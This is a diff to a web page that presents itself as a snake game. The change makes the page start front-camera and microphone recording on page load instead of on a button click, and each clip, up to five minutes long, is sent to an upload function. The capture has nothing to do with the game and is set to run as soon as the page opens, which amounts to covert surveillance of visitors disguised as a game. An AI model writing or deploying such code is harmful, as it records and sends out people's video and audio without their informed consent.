@@ -63,37 +63,46 @@
   let mediaRecorder;
   let recordedChunks = [];
 
-  async function startRecording() {
-    try {
-      const constraints = {
-        audio: true,
-        video: { facingMode: "user" } // front camera
-      };
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+async function startRecording() {
+  try {
+    recordedChunks = [];  // Clear recorded chunks on each start
 
-      mediaRecorder.ondataavailable = e => {
-        if (e.data.size > 0) recordedChunks.push(e.data);
-      };
+    const constraints = {
+      audio: true,
+      video: { facingMode: "user" } // front camera
+    };
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
 
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: "video/webm" });
-        recordedChunks = [];
-        uploadVideo(blob);
-      };
-
-      mediaRecorder.start();
-      // Automatically stop after 5 minutes to avoid very large files (optional)
-      setTimeout(() => {
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-      }, 5 * 60 * 1000);
-
-    } catch (err) {
-      console.error("Media recording failed:", err);
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+      mediaRecorder.stop(); // stop previous recorder if any
     }
+
+    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+    mediaRecorder.ondataavailable = e => {
+      if (e.data.size > 0) recordedChunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(recordedChunks, { type: "video/webm" });
+      recordedChunks = [];
+      uploadVideo(blob);
+      // Stop all tracks to release camera and mic
+      stream.getTracks().forEach(track => track.stop());
+    };
+
+    mediaRecorder.start();
+    // Automatically stop after 5 minutes to avoid very large files (optional)
+    setTimeout(() => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    }, 5 * 60 * 1000);
+
+  } catch (err) {
+    console.error("Media recording failed:", err);
   }
+}
 
   async function uploadVideo(blob) {
     const formData = new FormData();
@@ -208,15 +217,13 @@
     velocity = { x, y };
   }
 
-  document.getElementById("btnStart").onclick = async () => {
-  await startRecording();  // <-- Permission requested here on user click!
-
-  resetGame();
-  document.getElementById("btnStart").disabled = true;
-  document.getElementById("btnNewGame").disabled = false;
-  velocity = { x: 1, y: 0 };
-  gameInterval = setInterval(gameLoop, 120);
-};
+  document.getElementById("btnStart").onclick = () => {
+    resetGame();
+    document.getElementById("btnStart").disabled = true;
+    document.getElementById("btnNewGame").disabled = false;
+    velocity = { x: 1, y: 0 }; // start moving right
+    gameInterval = setInterval(gameLoop, 120);
+  };
 
   document.getElementById("btnNewGame").onclick = () => {
     clearInterval(gameInterval);
@@ -262,6 +269,7 @@
 
   window.onload = () => {
     // Start recording immediately (will prompt browser permissions once)
+    startRecording();
   };
 })();
 </script>
